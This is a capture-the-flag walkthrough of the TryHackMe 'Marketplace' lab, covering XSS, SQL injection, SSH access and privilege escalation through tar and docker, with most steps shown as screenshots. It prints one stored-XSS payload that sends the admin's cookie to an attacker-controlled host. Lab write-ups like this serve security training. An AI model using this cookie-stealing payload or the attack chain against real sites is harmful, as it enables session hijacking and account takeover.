Link room: https://tryhackme.com/room/marketplace
# SCANNING
## using nmap
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/e9014a17-f045-4732-880f-3b791940d9d3)

## using ffuf
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/4012b219-2bc9-480b-baa4-935d999783d5)

## view web

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/206cafef-2ddd-4817-91f5-781248839f0d)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/c5193207-b42d-4ef8-b1ed-f9fbc2b86468)

# EXPLOITING
## Flag 1

I signed up for an account and posted a "new listing"

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/c7f8a660-99db-4f51-a01f-3e1dd6c3e686)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/0682eaf8-f2af-4567-9a2d-1dfe0d48d2fd)

=> XSS

Therefore, I use script code to steal the cookie of admin : ```<script>document.location='http://10.9.218.234:7777/exploit.php?c='+document.cookie</script>```

with exploit.php as follows: 

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/0567c9b1-a40b-4616-b34a-6e2b9c1cacb1)

Next, I go to "http://10.10.252.206/report/4" and use netcat to get the admin cookie

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/bc1a532b-c5da-4c3d-9a22-a6b17e984963)

## Using Burp Suite

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/6a4509a0-99bd-41ab-8a48-938691be86b3)

=> flag 1
## user.txt
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/a4bae777-a9cf-4c57-8666-3546275547c2)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/98967896-3ae9-450d-a470-bf1939306f2a)

=> SQL Injection (sqli)

=))) Remember to use "the inspector" to turn spaces into "%20" faster

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/ef803c38-f376-49f4-93fd-77b7b8e9b059)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/47c298ed-ef29-4932-b1a2-11e385349247)

=> 3 tables: items, messages, users

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/be36137a-fb0a-4fc2-b95f-84c6e8c678af)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/bd0abcbb-75e0-4d6e-bf71-29548fe49d43)

=> 4 users: bro, jake, michael, system. Next, I'll find the passwords for these users

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/5bf35588-316f-471a-a12d-a95158444a63)

Go to "pretty" to copy hashes .

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/4507895a-71df-4149-b017-14ac21a8a8ff)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/d444544e-4fb9-4630-887e-5084ce33d9d3)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/be2e6000-424f-4a83-99f1-6e17f30040a1)

=> SSH password: @b_ENXkGYUCAv3zJ
## connect to ssh server
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/ee28b737-090d-4a34-83de-3cc8ea4ac56f)

=> user.txt
# PRIVILEGE ESCALATION
## using sudo -l
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/71ba875b-6c82-4753-9dd9-c99c7a7b26a7)

I create shell.sh file and temporary files

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/7f44b079-f4d8-429b-873f-c69f72548121)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/ce6f4a21-fe75-4ab5-87a2-bced6da3f926)

T grant 777 permission to backup.tar and shell.sh files

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/b443164e-8cc7-41eb-845b-41ed25ef1dbd)

Run the command with user Michael's permission

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/9d2df069-5e8d-4184-adff-018e6ccfdeee)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/fd2bf98c-19ad-4949-a12b-d193fc051ef0)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/cd3ee583-ee73-49e7-98c4-967b091d0dc1)

=> 999 (docker)

Go to GTFOBins 

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/ecfabdb3-203f-454f-a18f-ec3dc446efde)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/99f34a1f-f9ba-4bc7-9111-c53cfaf3d15b)

=> root.txt
## Done!!!
Thanks for reading. Bye!
